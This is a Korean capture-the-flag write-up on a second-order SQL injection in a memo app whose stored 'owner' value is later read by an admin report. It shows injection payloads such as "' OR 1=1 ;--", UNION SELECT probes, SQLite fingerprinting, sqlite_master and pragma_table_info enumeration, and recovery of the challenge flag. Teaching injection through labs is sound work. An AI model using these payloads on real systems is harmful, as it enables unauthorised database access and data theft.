@@ -1,0 +1,70 @@
+<h3>문제설명 :&nbsp;</h3>
+<p>메모를 남기면 소유자 이름과 함께 저장되는 입주사 메모장이다. 관리자 화면에는 소유자별 통계를 볼 수 있다.</p>
+<h3>목표 :</h3>
+<p>나중에 실행되는 경로를 통해 주입을 성사시켜라.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<pre><code>POST /api/notes          body {"owner": "...", "body": "..."}
+GET  /api/admin/report   차주별 기록 건수 집계</code></pre>
+<p>페이지에 위와 같은 힌트가 숨어있다.&nbsp;</p>
+<p>&nbsp;</p>
+<p>실제로</p>
+<p></p><figure><span><img src="image-1.png"></span></figure>
+<p></p>
+<p>&nbsp;</p>
+<p>기록등록 버튼을 누르면 POST가, 집계 리포트 버튼을 누르면 GET 이 호출되는것을 알 수 있다.</p>
+<p>&nbsp;</p>
+<p></p><figure><span><img src="image-2.png"></span></figure>
+<p></p>
+<p>&nbsp;</p>
+<p></p><figure><span><img src="image-3.png"></span><figcaption>POST 요청을 할때</figcaption>
+</figure>
+<figure><span><img src="image-4.png"></span><figcaption>GET을 보낼때</figcaption>
+</figure>
+<p></p>
+<p>&nbsp;</p>
+<p>우선 owner 에 '를 넣어보았다.. 그런데</p>
+<p><span>GET으로 집계 리포트를 확인했을 때 오류가 나타났다.</span></p>
+<pre><code>{"error":"unrecognized token: \"'''\"","owner":"'"}</code></pre>
+<p><span>POST 요청으로 기록을 등록할 때는 오류가 보이지 않았지만, 저장한 </span><span>owner</span><span>를 리포트에서 다시 읽을 때 오류가 발생한 것이다. 따라서 입력한 값이 </span><b><span>저장된 뒤 나중에 사용되는 지점</span></b><span>을 살펴봐야겠다고 생각했다.</span></p>
+<p>&nbsp;</p>
+<p><span>먼저 작은따옴표 뒤에 항상 참인 조건을 붙여 보았다.</span></p>
+<pre><code>' OR 1=1 ;--</code></pre>
+<p><span>리포트에는 해당 </span><span>owner</span><span>의 </span><span>count</span><span>가 </span><span>36</span><span>으로 나타났다.</span></p>
+<pre><code>{"count":36,"extra":[],"owner":"' OR 1=1 ;--"}</code></pre>
+<p><span>1=1</span><span>은 항상 참이다. </span><span>OR</span><span>로 이 조건이 연결되면 원래 특정 차주의 기록만 세려던 범위가 넓어질 수 있다. 정상적으로 한 건을 등록했는데 집계값이 크게 달라졌다는 점에서, 저장된 </span><span>owner</span><span>가 리포트의 SQL 조건에 영향을 준다고 판단했다.</span></p>
+<p>&nbsp;</p>
+<p><span>물론.. 건수만 바꾸는 것으로는 다른 데이터의 값을 볼 수 없다. 그래서 원래 조회 결과에 새로운 결과 행을 합치는 </span><span>UNION SELECT</span><span>를 생각했다.</span></p>
+<pre><code>{"error":"no such column: userAgent"}
+{"error":"no such column: owner"}</code></pre>
+<p><span>처음에는 리포트 응답에 보이는 이름을 SQL 열 이름으로 생각하고 UNION SELECT 를 사용했다. 하지만 보이는대로 실패했다..</span></p>
+<p><span>하지만 추가 조회 결과가 </span><span>extra</span><span>에 담기는 것을 확인했다.</span><span></span></p>
+<p>&nbsp;</p>
+<p><span>일단 UNION SELECT 를 사용하려면 테이블의 이름은 무엇인지 열 이름은 어떻게 되는지를 알아야한다.</span></p>
+<p><span>그걸 알려며 일단 이 서버의 DBMS가 무엇인지 알 필요가 있다.</span></p>
+<p>&nbsp;</p>
+<p><span>서버 코드를 볼 수 없으므로 DBMS가 무엇인지 처음부터 알 수는 없다. 그래서 우선 SQLite 함수가 동작하는지 시험해 보았다.</span></p>
+<pre><code>SELECT sqlite_version()</code></pre>
+<p><span>리포트의 </span><span>extra</span><span>에 다음 결과가 나타났다.</span></p>
+<pre><code>"extra":[["3.46.1"]]</code></pre>
+<p>다행이었다..</p>
+<p>&nbsp;</p>
+<p><span>SQLite에서는 </span><span>sqlite_master</span><span>에서 데이터베이스 구조 정보를 조회할 수 있다. </span><span>type</span><span>이 </span><span>'table'</span><span>인 항목의 </span><span>name</span><span>을 조회했다.</span></p>
+<pre><code>SELECT name
+FROM sqlite_master
+WHERE type = 'table'</code></pre>
+<p><span>리포트의 </span><span>extra</span><span>에는 다음 이름들이 나타났다.</span></p>
+<pre><code>notes
+secrets
+sqlite_sequence</code></pre>
+<p>누가 봐도 수상한,, secrets을 먼저 조사해보기로 했다.</p>
+<p>secrets의 열들을 알아보기로 했다.</p>
+<pre><code>SELECT name
+FROM pragma_table_info('secrets')</code></pre>
+<p><span>이번에는 </span><span>extra</span><span>에 두 열 이름이 나타났다.</span></p>
+<pre><code>key
+value</code></pre>
+<p><span>그래서 key</span><span> 열을 조회하니 </span><span>admin_flag</span><span>라는 항목이 확인됐다. 그다음 </span><span>value</span><span> 열을 조회했고, 리포트의 </span><span>extra</span><span>에서 flag를 확인했다.</span></p>
+<pre><code>flag{todays_safe_write_is_tomorrows_unsafe_read}</code></pre>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
